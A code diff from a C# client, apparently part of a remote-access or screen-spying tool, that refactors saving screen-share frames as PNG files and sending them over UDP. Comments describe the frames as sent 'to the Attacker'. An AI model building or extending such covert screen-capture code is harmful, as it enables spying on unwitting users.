@@ -336,7 +336,7 @@ namespace ExtremLink_Client_v2.Classes
 
 
         // Sending frame functions:
-        public string CreatePngFile(RenderTargetBitmap frame)
+        public void CreatePngFile(RenderTargetBitmap frame, string newFileName)
         {
             // Input: A RenderTargetBitmap object which represent a frame from the sharescreen.
             // Output: The function creates a png file which contains the image and returns it's name.
@@ -350,55 +350,36 @@ namespace ExtremLink_Client_v2.Classes
             // Add the frame to the encoder
             encoder.Frames.Add(BitmapFrame.Create(frame));
 
-            // Generate a unique file name with timestamp
-            string fileName = "temp.png";
-
             try
             {
                 // Save the encoded image to a file
-                using (FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
+                using (FileStream fs = new FileStream(newFileName, FileMode.Create, FileAccess.Write))
                 {
                     encoder.Save(fs);
                 }
-
-                return fileName;
             }
             catch (Exception ex)
             {
                 throw new IOException($"Failed to create PNG file: {ex.Message}", ex);
             }
         }
-        public string ConvertPngToH265(string pngFile)
+        public byte[] GetFileContent(string fileName)
         {
-            // Input: A string which represent a png file name.
-            // Output: The function creates a temp h265 file and returns it's name.
-            string tempH265File = "temp.h265";
-            using Mat image = Cv2.ImRead(pngFile, ImreadModes.Color);
-            int width = image.Width;
-            int height = image.Height;
-
-            // Create H.265 video writer
-            using var writer = new VideoWriter(
-                tempH265File,
-                FourCC.HEVC,
-                1,
-                new OpenCvSharp.Size(width, height));
-
-            // Write the single frame
-            writer.Write(image);
-            writer.Release();
-
-            return tempH265File;
-        }
-        public byte[] ConvertH265ToByteArray(string h265File)
-        {
-            // Input: A string which represent a h265 file name.
-            // Output: The function returns the file content as a byte array.
-            return File.ReadAllBytes(h265File);
+            try
+            {
+                // Read all bytes of the file into a byte array
+                byte[] fileContent = File.ReadAllBytes(fileName);
+                return fileContent;
+            }
+            catch (Exception ex)
+            {
+                // Handle exceptions such as file not found or permission issues
+                throw new IOException($"Failed to read file content: {ex.Message}", ex);
+            }
         }
         public void SendFrame(byte[] frame)
         {
-            // Input: A byte array which contains the content of an h265 file.
+            // Input: A byte array which contains the content of a file which contains the frame.
             // Output: The function sends the given byte array to the Attacker.
 
             // Define packet size (MTU-safe)
@@ -427,6 +408,39 @@ namespace ExtremLink_Client_v2.Classes
                 this.udpSocket.SendTo(packet, this.serverUdpEndPoint);
             }
         }
+        
+        
+        /*
+        public string ConvertPngToH265(string pngFile)
+        {
+            // Input: A string which represent a png file name.
+            // Output: The function creates a temp h265 file and returns it's name.
+            string tempH265File = "temp.h265";
+            using Mat image = Cv2.ImRead(pngFile, ImreadModes.Color);
+            int width = image.Width;
+            int height = image.Height;
+
+            // Create H.265 video writer
+            using var writer = new VideoWriter(
+                tempH265File,
+                FourCC.HEVC,
+                1,
+                new OpenCvSharp.Size(width, height));
+
+            // Write the single frame
+            writer.Write(image);
+            writer.Release();
+
+            return tempH265File;
+        }
+        public byte[] ConvertH265ToByteArray(string h265File)
+        {
+            // Input: A string which represent a h265 file name.
+            // Output: The function returns the file content as a byte array.
+            return File.ReadAllBytes(h265File);
+        }
+        */
+
 
         /*
         private byte[] ConvertRenderTargetBitmapToByteArray(RenderTargetBitmap renderTarget)
